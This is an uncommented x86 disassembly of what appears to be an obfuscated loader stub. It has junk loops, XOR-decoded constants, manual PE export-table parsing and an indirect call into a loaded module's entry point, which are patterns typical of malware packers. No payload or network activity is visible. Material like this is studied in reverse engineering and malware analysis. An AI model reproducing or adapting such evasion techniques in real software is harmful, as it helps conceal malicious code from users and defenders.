  4056a3:	jne    0x4056b7
  4056a9:	xor    eax,eax
  4056ab:	xor    eax,DWORD PTR ds:0x4275ac
  4056b1:	inc    eax
  4056b2:	mov    ds:0x4275ac,eax
  4056b7:	jmp    0x405667
  4056bc:	mov    DWORD PTR ds:0x4275a8,0x1a
  4056c6:	cmp    DWORD PTR ds:0x4275a8,0x0
  4056cd:	je     0x40570b
  4056d3:	cmp    DWORD PTR ds:0x4275a8,0x24
  4056da:	jne    0x4056f5
  4056e0:	push   0x8e07
  4056e5:	push   0x4292a5
  4056ea:	push   0x400000
  4056ef:	call   DWORD PTR ds:0x4279db
  4056f5:	mov    eax,ds:0x4275a8
  4056fa:	dec    eax
  4056fb:	mov    ds:0x4275a8,eax
  405700:	jmp    0x4056c6
  405705:	neg    DWORD PTR ds:0x42c89e
  40570b:	mov    eax,DWORD PTR [ebp-0x20]
  40570e:	add    edx,0x3568
  405714:	mov    DWORD PTR [ebp-0x1c],eax
  405717:	xor    eax,eax
  405719:	add    eax,DWORD PTR ds:0x4278bb
  40571f:	mov    edi,DWORD PTR ds:0x4278bf
  405725:	sub    eax,edi
  405727:	add    eax,DWORD PTR [eax+edi*1]
  40572a:	mov    eax,ds:0x4091a0
  40572f:	or     DWORD PTR ds:0x427d1f,ecx
  405735:	mov    eax,DWORD PTR [eax+0x198]
  40573b:	sub    edx,DWORD PTR ds:0x4292b5
  405741:	mov    DWORD PTR [ebp-0xc],eax
  405744:	mov    eax,DWORD PTR [ebp-0x1c]
  405747:	mov    edx,DWORD PTR [ebp-0xc]
  40574a:	or     DWORD PTR ds:0x427594,ebx
  405750:	xor    eax,esi
  405752:	sbb    edi,0x2806
  405758:	add    eax,ebx
  40575a:	xor    edi,0x222f
  405760:	mov    DWORD PTR [edx],eax
  405762:	and    DWORD PTR ds:0x42c89e,0x0
  40576c:	jmp    0x40577e
  405771:	mov    edx,DWORD PTR ds:0x42c89e
  405777:	inc    edx
  405778:	mov    DWORD PTR ds:0x42c89e,edx
  40577e:	cmp    DWORD PTR ds:0x42c89e,0x1b
  405785:	jae    0x4057c4
  40578b:	cmp    DWORD PTR ds:0x42c89e,0x4
  405792:	jne    0x4057a3
  405798:	push   0x755f
  40579d:	call   DWORD PTR ds:0x4279df
  4057a3:	cmp    DWORD PTR ds:0x42c89e,0x3
  4057aa:	jne    0x4057bf
  4057b0:	xor    edx,edx
  4057b2:	or     edx,DWORD PTR ds:0x42c89e
  4057b8:	inc    edx
  4057b9:	mov    DWORD PTR ds:0x42c89e,edx
  4057bf:	jmp    0x405771
  4057c4:	lea    eax,[ebp-0x14]
  4057c7:	mov    DWORD PTR [ebp-0x44],eax
  4057ca:	and    DWORD PTR ds:0x4275a4,0x0
  4057d4:	jmp    0x4057e6
  4057d9:	mov    edx,DWORD PTR ds:0x4275a4
  4057df:	inc    edx
  4057e0:	mov    DWORD PTR ds:0x4275a4,edx
  4057e6:	cmp    DWORD PTR ds:0x4275a4,0x1c
  4057ed:	jae    0x40582a
  4057f3:	cmp    DWORD PTR ds:0x4275a4,0x11
  4057fa:	jne    0x40580b
  405800:	push   0x864b
  405805:	call   DWORD PTR ds:0x4279e3
  40580b:	cmp    DWORD PTR ds:0x4275a4,0x10
  405812:	jne    0x405825
  405818:	mov    edx,DWORD PTR ds:0x4275a4
  40581e:	inc    edx
  40581f:	mov    DWORD PTR ds:0x4275a4,edx
  405825:	jmp    0x4057d9
  40582a:	mov    eax,DWORD PTR [ebp-0x1c]
  40582d:	mov    edx,DWORD PTR [ebp-0x44]
  405830:	xor    eax,esi
  405832:	or     DWORD PTR ds:0x4275a0,edx
  405838:	add    eax,ebx
  40583a:	adc    DWORD PTR ds:0x4275a4,0x37fa
  405844:	mov    DWORD PTR [edx],eax
  405846:	and    DWORD PTR ds:0x4292c9,edi
  40584c:	mov    DWORD PTR [ebp-0x54],ecx
  40584f:	lea    eax,[ebp-0x54]
  405852:	or     edi,edi
  405854:	mov    DWORD PTR [ebp-0x10],eax
  405857:	mov    edi,DWORD PTR ds:0x4292b1
  40585d:	or     edi,DWORD PTR ds:0x4275a8
  405863:	mov    DWORD PTR ds:0x4292b1,edi
  405869:	mov    eax,DWORD PTR [ebp-0x54]
  40586c:	mov    DWORD PTR ds:0x4292a1,0x1d
  405876:	cmp    DWORD PTR ds:0x4292a1,0x0
  40587d:	je     0x4058ca
  405883:	cmp    DWORD PTR ds:0x4292a1,0xb
  40588a:	jne    0x40589c
  405890:	push   DWORD PTR [ebp-0x24]
  405893:	push   DWORD PTR [ebp-0x14]
  405896:	call   DWORD PTR ds:0x427aaf
  40589c:	cmp    DWORD PTR ds:0x4292a1,0xc
  4058a3:	jne    0x4058b6
  4058a9:	mov    ecx,DWORD PTR ds:0x4292a1
  4058af:	dec    ecx
  4058b0:	mov    DWORD PTR ds:0x4292a1,ecx
  4058b6:	xor    ecx,ecx
  4058b8:	xor    ecx,DWORD PTR ds:0x4292a1
  4058be:	dec    ecx
  4058bf:	mov    DWORD PTR ds:0x4292a1,ecx
  4058c5:	jmp    0x405876
  4058ca:	mov    ecx,DWORD PTR [ebp-0x10]
  4058cd:	or     DWORD PTR ds:0x427d0f,0x2cf9
  4058d7:	xor    eax,esi
  4058d9:	mov    edi,DWORD PTR ds:0x427d07
  4058df:	or     DWORD PTR ds:0x4292b9,edi
  4058e5:	add    eax,0x32729e
  4058ea:	mov    DWORD PTR [ecx],eax
  4058ec:	sub    edi,edi
  4058ee:	mov    eax,ds:0x409274
  4058f3:	sbb    DWORD PTR ds:0x42c882,0x4292dd
  4058fd:	mov    DWORD PTR [ebp-0x28],0x8e12febe
  405904:	sbb    DWORD PTR ds:0x427d0f,0x4292d5
  40590e:	mov    eax,DWORD PTR [eax]
  405910:	mov    cx,WORD PTR [ebp-0x14]
  405914:	movzx  edi,WORD PTR ds:0x4292dd
  40591b:	and    DWORD PTR ds:0x4292d9,edi
  405921:	movzx  ecx,cx
  405924:	add    DWORD PTR ds:0x4275b0,0x4292b5
  40592e:	add    ecx,DWORD PTR [eax]
  405930:	or     edi,edi
  405932:	mov    DWORD PTR [ebp-0x34],0xf89c8531
  405939:	mov    DWORD PTR [ebp-0x10],ecx
  40593c:	sub    ecx,DWORD PTR ds:0x4292c1
  405942:	mov    edi,0x5a3fc9e
  405947:	mov    eax,DWORD PTR [ebp-0x1c]
  40594a:	mov    DWORD PTR ds:0x427d1b,0x10
  405954:	cmp    DWORD PTR ds:0x427d1b,0x0
  40595b:	je     0x4059b1
  405961:	cmp    DWORD PTR ds:0x427d1b,0x6
  405968:	jne    0x405983
  40596e:	push   0x1942
  405973:	push   0x427d03
  405978:	push   0x427644
  40597d:	call   DWORD PTR ds:0x427ab3
  405983:	cmp    DWORD PTR ds:0x427d1b,0x7
  40598a:	jne    0x40599f
  405990:	xor    ecx,ecx
  405992:	xor    ecx,DWORD PTR ds:0x427d1b
  405998:	dec    ecx
  405999:	mov    DWORD PTR ds:0x427d1b,ecx
  40599f:	mov    ecx,DWORD PTR ds:0x427d1b
  4059a5:	dec    ecx
  4059a6:	mov    DWORD PTR ds:0x427d1b,ecx
  4059ac:	jmp    0x405954
  4059b1:	mov    ecx,DWORD PTR [ebp-0xc]
  4059b4:	xor    eax,esi
  4059b6:	or     DWORD PTR ds:0x4292cd,0x78e6
  4059c0:	add    eax,ebx
  4059c2:	mov    DWORD PTR ds:0x4292b1,0x5c9d
  4059cc:	cmp    DWORD PTR [ecx],eax
  4059ce:	jne    0x405c08
  4059d4:	mov    eax,DWORD PTR [ebp-0x1c]
  4059d7:	xor    ecx,DWORD PTR ds:0x4292c1
  4059dd:	mov    ecx,DWORD PTR [ebp-0x10]
  4059e0:	xor    eax,esi
  4059e2:	add    eax,ebx
  4059e4:	mov    DWORD PTR ds:0x4275a4,0x5c09
  4059ee:	cmp    DWORD PTR [ecx],eax
  4059f0:	mov    DWORD PTR ds:0x4275b0,0x35e5
  4059fa:	jne    0x405ad7
  405a00:	mov    eax,DWORD PTR [ebp-0x1c]
  405a03:	mov    ecx,DWORD PTR [ebp-0x44]
  405a06:	xor    eax,esi
  405a08:	add    eax,ebx
  405a0a:	mov    DWORD PTR [ecx],eax
  405a0c:	and    DWORD PTR ds:0x42c886,0x0
  405a16:	jmp    0x405a28
  405a1b:	mov    edx,DWORD PTR ds:0x42c886
  405a21:	inc    edx
  405a22:	mov    DWORD PTR ds:0x42c886,edx
  405a28:	cmp    DWORD PTR ds:0x42c886,0x1e
  405a2f:	jae    0x405ab0
  405a35:	cmp    DWORD PTR ds:0x42c886,0x2b
  405a3c:	jne    0x405a4d
  405a42:	push   0x2523
  405a47:	call   DWORD PTR ds:0x427ab7
  405a4d:	jmp    0x405a1b
  405a52:	and    DWORD PTR ds:0x4292b5,0x0
  405a5c:	xor    edx,edx
  405a5e:	xor    edx,DWORD PTR ds:0x4292b5
  405a64:	inc    edx
  405a65:	mov    DWORD PTR ds:0x4292b5,edx
  405a6b:	cmp    DWORD PTR ds:0x4292b5,0xe
  405a72:	jne    0x405a83
  405a78:	push   0x3988
  405a7d:	call   DWORD PTR ds:0x4279e7
  405a83:	cmp    DWORD PTR ds:0x4292b5,0xd
  405a8a:	jne    0x405a9d
  405a90:	mov    edx,DWORD PTR ds:0x4292b5
  405a96:	inc    edx
  405a97:	mov    DWORD PTR ds:0x4292b5,edx
  405a9d:	cmp    DWORD PTR ds:0x4292b5,0x19
  405aa4:	jb     0x405a5c
  405aaa:	sbb    DWORD PTR ds:0x4292c9,ebx
  405ab0:	mov    eax,DWORD PTR [ebp-0x44]
  405ab3:	mov    ecx,DWORD PTR [ebp-0x34]
  405ab6:	xor    ecx,esi
  405ab8:	sub    edx,DWORD PTR ds:0x4292ad
  405abe:	mov    edx,0xffcd8d62
  405ac3:	sub    DWORD PTR ds:0x427cf7,0x427d0f
  405acd:	sub    edx,ecx
  405acf:	not    DWORD PTR ds:0x4292ad
  405ad5:	add    DWORD PTR [eax],edx
  405ad7:	and    DWORD PTR ds:0x4292ad,0x0
  405ae1:	mov    eax,ds:0x4292ad
  405ae6:	inc    eax
  405ae7:	mov    ds:0x4292ad,eax
  405aec:	cmp    DWORD PTR ds:0x4292ad,0x26
  405af3:	jne    0x405b19
  405af9:	push   DWORD PTR [ebp-0x28]
  405afc:	push   0x26cd
  405b01:	push   0x51bd
  405b06:	push   0x1327
  405b0b:	push   0x7353
  405b10:	push   DWORD PTR [ebp-0x1c]
  405b13:	call   DWORD PTR ds:0x4279eb
  405b19:	cmp    DWORD PTR ds:0x4292ad,0x16
  405b20:	jb     0x405ae1
  405b26:	mov    eax,ds:0x409274
  405b2b:	mov    eax,DWORD PTR [eax]
  405b2d:	mov    cx,WORD PTR [ebp-0x14]
  405b31:	movzx  ecx,cx
  405b34:	adc    DWORD PTR ds:0x4292a9,0x4292d1
  405b3e:	add    ecx,DWORD PTR [eax]
  405b40:	mov    DWORD PTR [ebp-0x10],ecx
  405b43:	mov    eax,ds:0x42c892
  405b48:	adc    DWORD PTR ds:0x42c89a,eax
  405b4e:	mov    eax,DWORD PTR [ebp-0x30]
  405b51:	sbb    ecx,DWORD PTR ds:0x4292b9
  405b57:	mov    ecx,DWORD PTR [ebp-0x30]
  405b5a:	or     DWORD PTR ds:0x42c88a,0x6b1f
  405b64:	xor    eax,esi
  405b66:	lea    eax,[eax+eax*1+0x32729e]
  405b6d:	adc    DWORD PTR ds:0x42759c,0x427d07
  405b77:	xor    ecx,esi
  405b79:	sub    ecx,eax
  405b7b:	mov    DWORD PTR ds:0x4275b0,0x4a7
  405b85:	mov    ax,WORD PTR [ebp-0x14]
  405b89:	mov    DWORD PTR ds:0x42c88e,0x21d5
  405b93:	movzx  eax,ax
  405b96:	mov    DWORD PTR ds:0x4292b9,0x441f
  405ba0:	cmp    eax,ecx
  405ba2:	mov    ecx,0x2c38
  405ba7:	mov    eax,DWORD PTR [ebp-0x34]
  405baa:	movzx  ecx,WORD PTR [ebp-0x14]
  405bae:	jg     0x405beb
  405bb4:	or     DWORD PTR ds:0x42c88e,0x6341
  405bbe:	xor    eax,esi
  405bc0:	sbb    DWORD PTR ds:0x427d13,0x4292bd
  405bca:	sub    ecx,eax
  405bcc:	sbb    DWORD PTR ds:0x4292a9,0x68
  405bd6:	sub    ecx,ebx
  405bd8:	mov    DWORD PTR ds:0x4292b5,0x7dde
  405be2:	mov    WORD PTR [ebp-0x14],cx
  405be6:	jmp    0x405c08
  405beb:	xor    eax,esi
  405bed:	mov    DWORD PTR ds:0x4292c1,0x28f0
  405bf7:	lea    eax,[eax+ecx*1+0x32729e]
  405bfe:	mov    DWORD PTR ds:0x4275a4,ecx
  405c04:	mov    WORD PTR [ebp-0x14],ax
  405c08:	mov    ecx,DWORD PTR [ebp-0x28]
  405c0b:	mov    eax,ds:0x427594
  405c10:	mov    eax,0x8e12febe
  405c15:	cmp    ecx,eax
  405c17:	je     0x405c41
  405c1d:	not    eax
  405c1f:	mov    eax,DWORD PTR [ebp-0xc]
  405c22:	mov    DWORD PTR ds:0x427598,0x90
  405c2c:	mov    DWORD PTR [eax],0x60341e8d
  405c32:	mov    DWORD PTR ds:0x427cfb,0xcef
  405c3c:	jmp    0x405fec
  405c41:	mov    DWORD PTR ds:0x427cfb,ecx
  405c47:	mov    ecx,DWORD PTR [ebp-0x28]
  405c4a:	mov    DWORD PTR ds:0x4275a8,0x60ce
  405c54:	cmp    ecx,0x5142ddbc
  405c5a:	mov    DWORD PTR ds:0x4292d5,0x22e7
  405c64:	jne    0x405dd1
  405c6a:	not    eax
  405c6c:	mov    eax,DWORD PTR [ebp-0xc]
  405c6f:	mov    DWORD PTR [eax],0x4214febc
  405c75:	mov    eax,DWORD PTR [ebp-0xc]
  405c78:	mov    DWORD PTR ds:0x42c89e,0x9bc
  405c82:	mov    DWORD PTR [ebp-0x4],eax
  405c85:	mov    eax,DWORD PTR [ebp-0x30]
  405c88:	mov    DWORD PTR ds:0x4292bd,ebx
  405c8e:	mov    eax,DWORD PTR [ebp-0x1c]
  405c91:	mov    eax,0x59e1
  405c96:	mov    DWORD PTR [ebp-0x4c],edi
  405c99:	mov    eax,DWORD PTR [ebp-0x4c]
  405c9c:	mov    DWORD PTR ds:0x4292d1,0x6603
  405ca6:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405cad:	mov    DWORD PTR ds:0x42c89e,0x4b8d
  405cb7:	cmp    eax,edi
  405cb9:	jne    0x405fec
  405cbf:	mov    ax,WORD PTR [ebp-0x8]
  405cc3:	and    DWORD PTR ds:0x4292c9,0x0
  405ccd:	mov    ecx,DWORD PTR ds:0x4292c9
  405cd3:	inc    ecx
  405cd4:	mov    DWORD PTR ds:0x4292c9,ecx
  405cda:	cmp    DWORD PTR ds:0x4292c9,0x7
  405ce1:	jne    0x405d0a
  405ce7:	push   0x3aec
  405cec:	push   0x6e2f
  405cf1:	push   0x3209
  405cf6:	push   0x4292c9
  405cfb:	push   DWORD PTR [ebp-0x20]
  405cfe:	push   DWORD PTR [ebp-0x28]
  405d01:	push   DWORD PTR [ebp-0x14]
  405d04:	call   DWORD PTR ds:0x427abb
  405d0a:	cmp    DWORD PTR ds:0x4292c9,0x6
  405d11:	jne    0x405d24
  405d17:	mov    ecx,DWORD PTR ds:0x4292c9
  405d1d:	inc    ecx
  405d1e:	mov    DWORD PTR ds:0x4292c9,ecx
  405d24:	cmp    DWORD PTR ds:0x4292c9,0x1a
  405d2b:	jb     0x405ccd
  405d31:	mov    ecx,0x8a42
  405d36:	and    DWORD PTR ds:0x427598,0x7f75
  405d40:	xor    ax,cx
  405d43:	mov    ecx,DWORD PTR ds:0x427594
  405d49:	xor    DWORD PTR ds:0x4292c9,ecx
  405d4f:	mov    ecx,0x3b08
  405d54:	add    ax,cx
  405d57:	mov    ecx,DWORD PTR [ebp-0x4]
  405d5a:	movzx  eax,ax
  405d5d:	sub    DWORD PTR ds:0x4292dd,0x42c892
  405d67:	not    eax
  405d69:	add    DWORD PTR ds:0x42c88a,0x427d03
  405d73:	and    eax,DWORD PTR [ecx]
  405d75:	mov    DWORD PTR ds:0x42c886,0x6891
  405d7f:	mov    ecx,DWORD PTR [ebp-0x4]
  405d82:	mov    DWORD PTR ds:0x4275ac,0x5963
  405d8c:	mov    DWORD PTR [ecx],eax
  405d8e:	jmp    0x405d9a
  405d93:	xor    DWORD PTR [ebp-0x4c],0xe149ebe
  405d9a:	xor    DWORD PTR ds:0x427d1b,0x1156
  405da4:	mov    ax,WORD PTR [ebp-0x8]
  405da8:	push   DWORD PTR [ebp-0x4]
  405dab:	call   0x401000
  405db0:	test   eax,eax
  405db2:	mov    DWORD PTR ds:0x4292d9,0x68ee
  405dbc:	je     0x405d93
  405dc2:	mov    DWORD PTR ds:0x4292b1,0x2e0e
  405dcc:	jmp    0x405fec
  405dd1:	mov    ecx,DWORD PTR [ebp-0x28]
  405dd4:	cmp    ecx,0x1443fcbd
  405dda:	mov    DWORD PTR ds:0x427598,0x1afd
  405de4:	jne    0x405e02
  405dea:	mov    eax,DWORD PTR [ebp-0xc]
  405ded:	mov    DWORD PTR ds:0x4292b9,0x35a9
  405df7:	mov    DWORD PTR [eax],0x60062d8f
  405dfd:	jmp    0x405fec
  405e02:	mov    ecx,DWORD PTR [ebp-0x28]
  405e05:	cmp    ecx,eax
  405e07:	mov    DWORD PTR ds:0x42c88a,0x2673
  405e11:	jne    0x405f71
  405e17:	and    DWORD PTR ds:0x427cff,0x0
  405e21:	xor    eax,eax
  405e23:	or     eax,DWORD PTR ds:0x427cff
  405e29:	inc    eax
  405e2a:	mov    ds:0x427cff,eax
  405e2f:	cmp    DWORD PTR ds:0x427cff,0xc
  405e36:	jne    0x405e47
  405e3c:	push   0x4d1d
  405e41:	call   DWORD PTR ds:0x427abf
  405e47:	cmp    DWORD PTR ds:0x427cff,0xb
  405e4e:	jne    0x405e62
  405e54:	xor    eax,eax
  405e56:	or     eax,DWORD PTR ds:0x427cff
  405e5c:	inc    eax
  405e5d:	mov    ds:0x427cff,eax
  405e62:	cmp    DWORD PTR ds:0x427cff,0x1f
  405e69:	jb     0x405e21
  405e6f:	mov    eax,DWORD PTR [ebp-0x1c]
  405e72:	mov    ecx,DWORD PTR [ebp-0xc]
  405e75:	xor    eax,esi
  405e77:	add    eax,ebx
  405e79:	cmp    DWORD PTR [ecx],eax
  405e7b:	je     0x405efe
  405e81:	mov    ecx,DWORD PTR [ebp-0x54]
  405e84:	mov    eax,DWORD PTR [ebp-0xc]
  405e87:	mov    eax,DWORD PTR [eax]
  405e89:	mov    eax,DWORD PTR [eax+0x3c]
  405e8c:	lea    ecx,[ecx*8+0x78]
  405e93:	add    eax,ecx
  405e95:	mov    ecx,DWORD PTR [ebp-0xc]
  405e98:	mov    ecx,DWORD PTR [ecx]
  405e9a:	mov    eax,DWORD PTR [eax+ecx*1]
  405e9d:	mov    DWORD PTR [ebp-0x8],eax
  405ea0:	mov    eax,DWORD PTR [ebp-0x1c]
  405ea3:	xor    eax,esi
  405ea5:	add    eax,ebx
  405ea7:	mov    DWORD PTR [ebp-0x4],eax
  405eaa:	mov    eax,DWORD PTR [ebp-0x1c]
  405ead:	mov    ecx,DWORD PTR [ebp-0x8]
  405eb0:	xor    eax,esi
  405eb2:	add    eax,ebx
  405eb4:	cmp    ecx,eax
  405eb6:	je     0x405fec
  405ebc:	mov    eax,DWORD PTR [ebp-0xc]
  405ebf:	mov    ecx,DWORD PTR [ebp-0x8]
  405ec2:	add    ecx,DWORD PTR [eax]
  405ec4:	mov    DWORD PTR [ebp-0x4],ecx
  405ec7:	mov    eax,DWORD PTR [ebp-0x4]
  405eca:	mov    ecx,DWORD PTR [ebp-0xc]
  405ecd:	mov    eax,DWORD PTR [eax+0xc]
  405ed0:	mov    ecx,DWORD PTR [ecx]
  405ed2:	mov    al,BYTE PTR [eax+ecx*1]
  405ed5:	add    al,0x35
  405ed7:	xor    al,0x49
  405ed9:	cmp    al,0xc9
  405edb:	je     0x405ef2
  405ee1:	mov    eax,DWORD PTR [ebp-0x1c]
  405ee4:	mov    ecx,DWORD PTR [ebp-0xc]
  405ee7:	xor    eax,esi
  405ee9:	add    eax,ebx
  405eeb:	mov    DWORD PTR [ecx],eax
  405eed:	jmp    0x405fec
  405ef2:	xor    DWORD PTR [ebp-0x28],0x5fd8f
  405ef9:	jmp    0x405fec
  405efe:	mov    eax,DWORD PTR [ebp-0xc]
  405f01:	mov    ecx,DWORD PTR [ebp-0x10]
  405f04:	mov    ecx,DWORD PTR [ecx]
  405f06:	mov    DWORD PTR [eax],ecx
  405f08:	mov    eax,DWORD PTR [ebp-0xc]
  405f0b:	mov    DWORD PTR [ebp-0x4],eax
  405f0e:	mov    eax,DWORD PTR [ebp-0x30]
  405f11:	mov    eax,DWORD PTR [ebp-0x1c]
  405f14:	mov    DWORD PTR [ebp-0x5c],edi
  405f17:	mov    eax,DWORD PTR [ebp-0x5c]
  405f1a:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405f21:	cmp    eax,edi
  405f23:	jne    0x405fec
  405f29:	mov    ax,WORD PTR [ebp-0x8]
  405f2d:	mov    ecx,0x8a42
  405f32:	xor    ax,cx
  405f35:	mov    ecx,0x3b08
  405f3a:	add    ax,cx
  405f3d:	mov    ecx,DWORD PTR [ebp-0x4]
  405f40:	movzx  eax,ax
  405f43:	not    eax
  405f45:	and    eax,DWORD PTR [ecx]
  405f47:	mov    ecx,DWORD PTR [ebp-0x4]
  405f4a:	mov    DWORD PTR [ecx],eax
  405f4c:	jmp    0x405f58
  405f51:	xor    DWORD PTR [ebp-0x5c],0xe149ebe
  405f58:	mov    ax,WORD PTR [ebp-0x8]
  405f5c:	push   DWORD PTR [ebp-0x4]
  405f5f:	call   0x401000
  405f64:	test   eax,eax
  405f66:	je     0x405f51
  405f6c:	jmp    0x405fec
  405f71:	mov    eax,DWORD PTR [ebp-0x28]
  405f74:	cmp    eax,0x33450cad
  405f79:	jne    0x405fec
  405f7f:	mov    eax,DWORD PTR [ebp-0xc]
  405f82:	mov    DWORD PTR [eax],0x443dc9d
  405f88:	mov    eax,DWORD PTR [ebp-0xc]
  405f8b:	mov    DWORD PTR [ebp-0x4],eax
  405f8e:	mov    eax,DWORD PTR [ebp-0x30]
  405f91:	mov    eax,DWORD PTR [ebp-0x1c]
  405f94:	mov    DWORD PTR [ebp-0x40],edi
  405f97:	mov    eax,DWORD PTR [ebp-0x40]
  405f9a:	mov    DWORD PTR [ebp-0x8],0x4eb5
  405fa1:	cmp    eax,edi
  405fa3:	jne    0x405fec
  405fa9:	mov    ax,WORD PTR [ebp-0x8]
  405fad:	mov    ecx,0x8a42
  405fb2:	xor    ax,cx
  405fb5:	mov    ecx,0x3b08
  405fba:	add    ax,cx
  405fbd:	mov    ecx,DWORD PTR [ebp-0x4]
  405fc0:	movzx  eax,ax
  405fc3:	not    eax
  405fc5:	and    eax,DWORD PTR [ecx]
  405fc7:	mov    ecx,DWORD PTR [ebp-0x4]
  405fca:	mov    DWORD PTR [ecx],eax
  405fcc:	jmp    0x405fd8
  405fd1:	xor    DWORD PTR [ebp-0x40],0xe149ebe
  405fd8:	mov    ax,WORD PTR [ebp-0x8]
  405fdc:	push   DWORD PTR [ebp-0x4]
  405fdf:	call   0x401000
  405fe4:	test   eax,eax
  405fe6:	je     0x405fd1
  405fec:	mov    eax,DWORD PTR [ebp-0x28]
  405fef:	cmp    eax,0x8e12febe
  405ff4:	je     0x405947
  405ffa:	mov    eax,DWORD PTR [ebp-0xc]
  405ffd:	mov    eax,ds:0x4091a0
  406002:	mov    eax,DWORD PTR [eax+0x18c]
  406008:	mov    eax,DWORD PTR [eax]
  40600a:	mov    DWORD PTR [ebp-0x74],eax
  40600d:	mov    eax,0xf89c8531
  406012:	mov    DWORD PTR [ebp-0x10],eax
  406015:	mov    DWORD PTR [ebp-0x10],eax
  406018:	mov    DWORD PTR [ebp-0x10],eax
  40601b:	mov    DWORD PTR [ebp-0x10],0xf89c8535
  406022:	mov    DWORD PTR [ebp-0x8],eax
  406025:	mov    DWORD PTR [ebp-0x8],0xf89c853d
  40602c:	mov    edi,DWORD PTR [ebp-0x20]
  40602f:	xor    edi,esi
  406031:	add    edi,ebx
  406033:	jmp    0x40606e
  406038:	mov    eax,DWORD PTR [ebp-0x18]
  40603b:	xor    eax,esi
  40603d:	lea    eax,[eax+edi*1+0x32729e]
  406044:	push   eax
  406045:	mov    eax,DWORD PTR [ebp-0x10]
  406048:	xor    eax,esi
  40604a:	lea    eax,[ebp+eax*1+0x3272a6]
  406051:	push   eax
  406052:	mov    eax,ds:0x4091a0
  406057:	push   DWORD PTR [eax+0x1bc]
  40605d:	call   0x402c87
  406062:	mov    eax,DWORD PTR [ebp-0x18]
  406065:	xor    eax,esi
  406067:	lea    edi,[edi+eax*1+0x32729e]
  40606e:	mov    eax,DWORD PTR [ebp-0x18]
  406071:	mov    ecx,DWORD PTR [ebp-0x18]
  406074:	xor    ecx,esi
  406076:	xor    eax,esi
  406078:	add    eax,ecx
  40607a:	mov    ecx,DWORD PTR [ebp-0x18]
  40607d:	xor    ecx,esi
  40607f:	lea    eax,[eax+ecx*1+0x9757da]
  406086:	cmp    edi,eax
  406088:	jbe    0x406038
  40608e:	mov    eax,DWORD PTR [ebp+0xc]
  406091:	mov    ds:0x409024,eax
  406096:	mov    eax,DWORD PTR [ebp+0x10]
  406099:	mov    ds:0x409278,eax
  40609e:	mov    eax,ds:0x409024
  4060a3:	mov    ecx,DWORD PTR [ebp-0x60]
  4060a6:	sub    eax,ebx
  4060a8:	xor    eax,esi
  4060aa:	mov    DWORD PTR [ecx],eax
  4060ac:	mov    eax,DWORD PTR [ebp-0x58]
  4060af:	cmp    eax,0xf89c8534
  4060b4:	je     0x406111
  4060ba:	mov    eax,DWORD PTR [ebp-0x20]
  4060bd:	mov    ecx,DWORD PTR [ebp-0x50]
  4060c0:	xor    eax,esi
  4060c2:	add    eax,ebx
  4060c4:	cmp    eax,ecx
  4060c6:	je     0x406111
  4060cc:	mov    eax,ds:0x4091a0
  4060d1:	mov    eax,DWORD PTR [eax+0x194]
  4060d7:	mov    ecx,DWORD PTR [eax]
  4060d9:	mov    eax,DWORD PTR [ecx+0x3c]
  4060dc:	push   DWORD PTR ds:0x409278
  4060e2:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4060e6:	push   DWORD PTR ds:0x409024
  4060ec:	add    eax,ecx
  4060ee:	mov    ecx,DWORD PTR ds:0x4091a0
  4060f4:	mov    ecx,DWORD PTR [ecx+0x194]
  4060fa:	push   DWORD PTR [ecx]
  4060fc:	call   eax
  4060fe:	mov    ecx,DWORD PTR ds:0x4091a0
  406104:	mov    ecx,DWORD PTR [ecx+0x1cc]
  40610a:	mov    DWORD PTR [ecx],eax
  40610c:	jmp    0x4063cb
  406111:	mov    eax,DWORD PTR [ebp-0x20]
  406114:	mov    ecx,DWORD PTR [ebp-0x74]
  406117:	xor    eax,esi
  406119:	add    eax,ebx
  40611b:	mov    edi,0xf89c85f5
  406120:	cmp    eax,ecx
  406122:	jne    0x406223
  406128:	mov    eax,DWORD PTR [ebp-0x20]
  40612b:	xor    eax,esi
  40612d:	add    eax,ebx
  40612f:	mov    ds:0x409224,eax
  406134:	mov    eax,DWORD PTR [ebp-0x20]
  406137:	xor    eax,esi
  406139:	add    eax,ebx
  40613b:	mov    ds:0x40921c,eax
  406140:	mov    eax,DWORD PTR [ebp-0x18]
  406143:	mov    DWORD PTR [ebp-0x8],eax
  406146:	mov    eax,DWORD PTR [ebp-0x20]
  406149:	mov    DWORD PTR [ebp+0xc],eax
  40614c:	mov    eax,DWORD PTR [ebp+0xc]
  40614f:	xor    eax,esi
  406151:	add    eax,ebx
  406153:	mov    DWORD PTR [ebp+0xc],eax
  406156:	mov    eax,ds:0x409020
  40615b:	mov    eax,DWORD PTR [eax]
  40615d:	mov    DWORD PTR [ebp+0xc],eax
  406160:	mov    eax,ds:0x409228
  406165:	mov    eax,DWORD PTR [eax]
  406167:	mov    DWORD PTR [ebp-0x60],eax
  40616a:	mov    DWORD PTR [ebp+0x10],0xf89c8735
  406171:	mov    eax,DWORD PTR [ebp+0x10]
  406174:	xor    eax,esi
  406176:	add    eax,ebx
  406178:	mov    DWORD PTR [ebp+0x10],eax
  40617b:	mov    eax,ds:0x4091a0
  406180:	mov    DWORD PTR [ebp+0x10],eax
  406183:	mov    eax,DWORD PTR [ebp+0xc]
  406186:	mov    DWORD PTR [ebp+0x10],eax
  406189:	mov    eax,DWORD PTR [ebp+0x10]
  40618c:	push   0x4
  40618e:	pop    ecx
  40618f:	sub    ecx,eax
  406191:	add    ecx,DWORD PTR [ebp-0x60]
  406194:	mov    DWORD PTR [ebp-0x34],edi
  406197:	mov    DWORD PTR [ebp-0x10],ecx
  40619a:	mov    DWORD PTR [ebp-0xc8],0xf89c8531
  4061a4:	mov    eax,DWORD PTR [ebp+0x10]
  4061a7:	mov    DWORD PTR [ebp-0xc4],eax
  4061ad:	mov    eax,DWORD PTR [ebp-0x10]
  4061b0:	mov    DWORD PTR [ebp-0xc0],eax
  4061b6:	mov    eax,DWORD PTR [ebp-0x34]
  4061b9:	xor    eax,esi
  4061bb:	add    eax,ebx
  4061bd:	mov    DWORD PTR [ebp-0xbc],eax
  4061c3:	lea    eax,[ebp-0x80]
  4061c6:	mov    DWORD PTR [ebp-0xb8],eax
  4061cc:	mov    eax,DWORD PTR [ebp-0xc8]
  4061d2:	xor    eax,esi
  4061d4:	add    eax,ebx
  4061d6:	mov    DWORD PTR [ebp-0xc8],eax
  4061dc:	lea    eax,[ebp-0xc8]
  4061e2:	push   eax
  4061e3:	mov    eax,DWORD PTR [ebp-0x8]
  4061e6:	xor    eax,esi
  4061e8:	add    eax,ebx
